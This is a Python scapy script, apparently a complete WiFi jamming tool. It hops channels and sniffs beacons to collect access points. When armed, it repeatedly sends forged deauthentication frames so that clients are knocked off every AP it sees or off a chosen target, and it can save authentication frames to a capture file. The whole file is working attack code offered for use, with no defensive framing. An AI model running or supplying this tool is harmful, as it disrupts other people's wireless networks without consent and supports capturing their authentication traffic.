#!/bin/python3
import argparse
import threading
import logging
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Elt
from scapy.utils import PcapWriter
from scapy.volatile import RandMAC
from scapy.sendrecv import sniff, sendp
from subprocess import Popen
from time import sleep

global AP_list
global ignore_AP
ignore_AP = []
AP_list = []

parser = argparse.ArgumentParser()
ap_method = parser.add_mutually_exclusive_group()
verbosity = parser.add_mutually_exclusive_group()

parser.add_argument('interface', action='store', help='Sets the interface to use for sending and receiving')

ap_method.add_argument('-l', '--ignore-list', dest='list', action='store', type=list, help='Ignore APs given by command line input (each MAC or SSID separated by spaces)')
ap_method.add_argument('-f', '--ignore-file', dest='file', action='store', type=str, help='Ignore APs from this file (each MAC or SSID separated by newlines)')
ap_method.add_argument('-t', '--target-AP', dest='target', action='store', type=str, help='Specifically target a single choice AP (by MAC or SSID')

verbosity.add_argument('-vv', '--very-verbose', dest='verbosity', action='store_const', const=logging.DEBUG, help='Set program to log debug information')
verbosity.add_argument('-v', '--verbose', dest='verbosity', action='store_const', const=logging.INFO, help='Set program to log normal functioning')

parser.add_argument('-o', '--output', dest='output', action='store', type=str, help='File to write captured Auth Frames to (will only jam if not set)')
parser.add_argument('-c', '--channel', dest='channels', action='store', type=list, help='Channels to hop on (default is 1-11)', default=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11])
parser.add_argument('-a', '--arm', dest='arm', action='store_true', help='Arm the WiFi jammer (will simply sniff beacons if not armed)', default=False)

args = parser.parse_args()
logging.basicConfig(format='\t%(message)s',level=args.verbosity)

if args.list != None:
	ignore_AP += args.list
	logging.debug('Running with Ignore AP list from command line = ' + str(ignore_AP))
elif args.file != None:
	with open(args.file, 'r') as file:
		ignore_AP += file.readlines()
		logging.debug('Running with Ignore AP list from file = ' + str(ignore_AP))

if args.output != None:
	output = PcapWriter(args.output, append=True)
	logging.debug('Setting output file = ' + str(args.output))
else:
	logging.debug('Running without output file')

def changeChannel(iface, channel):
	global current_channel
	current_channel = str(channel)
	command = ['iwconfig', iface, 'channel', current_channel]
	Popen(command, shell=False)
	logging.debug('Set channel = ' + current_channel + ' with command = ' + str(command))

def channelHop(iface, channels):
	logging.debug('Running function channelHop(' + iface + ', ' + str(channels))
	while True:
		for channel in channels:
			changeChannel(iface, channel)
			sleep(0.1)

def jammer():
	while True:
		if len(AP_list) != 0:
			for AP in AP_list:
				logging.info('De-Authenticating All Clients on AP ' + str(AP))
				DeAuth_Frame = RadioTap()/Dot11(addr1 = RandMAC(), addr2 = AP, addr3 = AP)/Dot11Deauth(reason=2)
				sendp(DeAuth_Frame, verbose=False)

def packetHandler(packet):
	if packet.haslayer(Dot11):
		AP_Mac = packet.addr2
		if packet.type == 0:
			if packet.subtype == 8:
				AP_name = bytes.decode(packet[Dot11Elt].info)
				if args.target != None:
					if AP_Mac == args.target or AP_name == args.target:
						AP_list.append(packet.addr2)
						logging.info('Target Found: MAC = ' + str(packet.addr2) + ', SSID = ' + AP_name + ', CH = ' + str(current_channel))
				elif packet.addr2 not in ignore_AP or bytes.decode(packet[Dot11Elt].info) not in ignore_AP:
					if packet.addr2 not in AP_list:
						AP_list.append(packet.addr2)
						logging.info('AP Found: MAC = ' + str(packet.addr2) + ', SSID = ' + AP_name + ', CH = ' + str(current_channel))
			elif packet.subtype == 11:
				if output:
					output.write(packet)
					logging.info('Authentication Frame Found: MAC = ' + str(packet.addr2) + ', SSID = ' + AP_name + ', CH = ' + str(current_channel))
			else:
				logging.debug('Found non-auth, non-beacon management frame')
	else:
		logging.debug('Found non-management frame transmission')

channelHopper = threading.Thread(target = channelHop, args=(args.interface, args.channels))
beaconSniffer = threading.Thread(target = sniff, kwargs = dict(prn=packetHandler, iface=args.interface))
jammer = threading.Thread(target = jammer)

channelHopper.start()
beaconSniffer.start()
if args.arm == True:
	jammer.start()